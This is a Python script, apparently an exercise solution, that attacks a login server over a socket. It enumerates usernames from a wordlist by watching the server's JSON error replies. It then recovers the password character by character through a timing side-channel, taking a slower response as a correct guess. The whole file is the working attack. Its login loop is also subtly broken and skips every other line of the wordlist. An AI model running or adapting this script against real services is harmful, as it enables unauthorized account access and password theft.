import sys
import socket
import json
import datetime


host = sys.argv[1]
port = int(sys.argv[2])

with socket.socket() as client_socket:
    address = (host, port)
    client_socket.connect(address)
    loginFile = open('logins.txt', 'r')
    for item in loginFile:
        login =loginFile.readline().strip()
        request = json.dumps({"login": login, "password": ' '})
        request = request.encode()
        client_socket.send(request)
        response = client_socket.recv(1024)
        response = response.decode()
        if response == json.dumps({"result": "Wrong login!"}):
            continue
        elif response == json.dumps({"result": "Wrong password!"}):
            break

    controlVar = True
    password = ''
    while controlVar:
        itemStr = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
        for lcv in itemStr:
            request = json.dumps({"login": login, "password": password + lcv})
            request = request.encode()
            start = datetime.datetime.now()
            client_socket.send(request)
            response = client_socket.recv(1024)
            finish = datetime.datetime.now()
            timeDifference = (finish - start).total_seconds()
            response = response.decode()
            if response == json.dumps({"result": "Wrong password!"}):
                if timeDifference >= .1:
                    password = password + lcv
                continue
            elif response == json.dumps({"result": "Connection success!"}):
                controlVar = False
                print(request)
                break